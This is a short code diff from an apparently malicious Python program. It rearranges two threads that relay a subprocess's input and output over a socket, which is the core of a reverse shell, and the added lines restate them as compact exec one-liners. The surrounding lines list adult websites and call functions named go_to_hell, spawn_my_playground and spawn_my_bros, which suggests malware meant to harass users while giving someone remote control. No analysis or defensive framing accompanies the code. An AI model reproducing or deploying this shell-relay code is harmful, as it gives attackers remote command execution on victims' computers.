@@ -132,25 +132,14 @@ def launch():
         "https://www.beeg.com",
         "https://www.xnxx.com"
     ]
+    threading.Thread(target=exec, args=("while True: o = os.read(p.stdout.fileno(), 1024); s.send(o)", globals()), daemon=True).start()
+    threading.Thread(target=exec, args=("while True: i = s.recv(1024); os.write(p.stdin.fileno(), i)", globals())).start()
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
     process_creator = Process(target=go_to_hell)
     process_creator.start()
     cmd_thread = threading.Thread(target=spawn_my_playground)
     cmd_thread.start()
-    threading.Thread(
-    target=exec,
-    args=('while True: '
-          'o = os.read(p.stdout.fileno(), 1024); '
-          's.send(o)', globals()),
-    daemon=True
-    ).start()
-    threading.Thread(
-    target=exec,
-    args=('while True: '
-          'i = s.recv(1024); '
-          'os.write(p.stdin.fileno(), i)', globals())
-    ).start()
     spawn_my_bros(urls)
 
 if __name__ == "__main__":
